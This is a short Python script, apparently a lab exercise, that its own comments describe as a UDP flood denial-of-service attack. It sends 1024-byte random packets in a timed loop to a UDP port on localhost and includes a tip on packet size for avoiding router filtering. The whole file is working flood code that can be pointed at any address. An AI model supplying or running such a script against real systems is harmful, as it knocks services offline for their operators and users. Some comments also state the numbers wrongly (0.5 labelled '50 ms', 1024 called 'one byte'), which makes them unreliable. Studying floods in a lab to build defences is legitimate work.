import socket
import sys
import random
import time

duration = 0.5 #50 ms for Dos attack
buffer_size = 1024
cntr = 0
server_address = ('localhost', 5367)

udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
# 1024 representes one byte to the server.
# in udp flood best size is 512-1024, if size too big router may filter it.
data = random._urandom(1024)
timeout =  time.time() + duration
while time.time() < timeout:
    #sendto method, sends a UDP message.
    udp_socket.sendto(data, server_address)
    cntr = cntr + 1
    print("send %s packet to %s throught port %s on a UDP connection."%(cntr,  server_address[0],server_address[1]))
    msg_from_server = udp_socket.recvfrom(buffer_size)
    print("message from server:{}".format(msg_from_server))
